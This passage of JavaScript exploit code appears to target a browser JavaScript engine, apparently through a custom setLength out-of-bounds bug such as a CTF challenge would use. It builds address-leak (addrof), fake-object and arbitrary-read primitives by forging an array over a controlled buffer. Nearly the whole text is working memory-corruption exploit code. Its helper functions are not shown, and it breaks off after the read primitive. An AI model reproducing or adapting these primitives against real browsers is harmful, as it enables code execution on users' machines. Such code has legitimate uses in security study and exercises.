...
var arr = [c2f(0xdead, 0xbeef), c2f(0xc0de, 0xcafe)];
var arr2 = [instance];
var fake_buffer = [c2f(0x1cb821, 0x725), c2f(0x2222, 0x3333)];

arr.setLength(30000);

function GetAddressOf(object){
    arr2[0] = object;
    return BigInt(f2b(arr[4]) >> BigInt(32));
}

function GetFakeObject(addr){
    arr[4] = b2f((addr << BigInt(32)) + 2n);
    return arr2[0];
}


let instance_addr = GetAddressOf(instance);
let fake_addr = GetAddressOf(fake_buffer) + 0x24n;

console.log(fake_addr.toString(16));

let fake = GetFakeObject(fake_addr);

function ArbRead(addr){
    fake_buffer[1] = c2f((addr|1) - 8, 0x8000);
    return f2b(fake[0]);
}
